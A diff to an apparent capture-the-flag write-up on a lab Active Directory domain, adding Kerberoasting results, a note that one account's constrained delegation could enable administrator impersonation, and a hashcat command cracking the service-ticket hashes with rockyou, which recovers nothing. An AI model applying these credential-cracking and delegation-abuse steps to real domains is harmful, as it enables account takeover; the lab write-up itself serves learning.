@@ -967,9 +967,20 @@ Through the shell we can collect the user flag located in the desktop. Then I tr
     POP3/BDEWVIR1000000   DEANNE_WASHINGTON  CN=CH-ecu-distlist1,OU=Groups,OU=OGC,OU=Stage,DC=thm,DC=corp  2023-06-12 18:05:54.488998  <never>                                 
     POP3/HAYSTACK         DARLA_WINTERS      CN=Domain Computers,CN=Users,DC=thm,DC=corp                   2023-07-18 18:21:44.443061  2023-07-18 18:28:56.952295  constrained 
 
+So we collected 8 unique hashes that we can try to reverse and one of those, darla winters, has constrained delegation set. It means that if we get her password then we can try to impersonate the administrator. More information on this attack can be read [here](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation). So we have juicy information here. Using hashcat:
+
+    hashcat.exe -a 0 -m 13100 kerberoastables C:\Users\filippo\wordlist\rockyou.txt
+    ...
+    Approaching final keyspace - workload adjusted.
+    Session..........: hashcat
+    Status...........: Exhausted
+    ....
+    Recovered........: 0/8 (0.00%) Digests (total), 0/8 (0.00%) Digests (new), 0/8 (0.00%) Salts
+
+Pity, nothing was found.
 
 
-    
+
 
 
 
